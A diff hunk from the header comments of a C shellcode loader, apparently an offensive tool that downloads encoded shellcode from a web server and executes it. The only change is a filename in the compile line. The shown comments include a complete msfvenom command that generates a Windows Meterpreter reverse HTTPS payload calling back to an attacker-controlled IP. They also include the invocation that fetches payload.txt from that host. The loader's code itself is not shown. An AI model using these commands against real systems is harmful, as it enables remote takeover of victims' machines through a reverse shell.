@@ -1,6 +1,6 @@
 // simple ex for downloading and executing shellcode with sockets from webserver
 // for msf alphamixed encoded shellcode
-// wine gcc -m32 downloadshellcode.c -lwsock32 -lWs2_32
+// wine gcc -m32 downloadshellcodealphamixed.c -lwsock32 -lWs2_32
 // msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw
 // call with a.exe http://192.168.2.103/payload.txt 
 
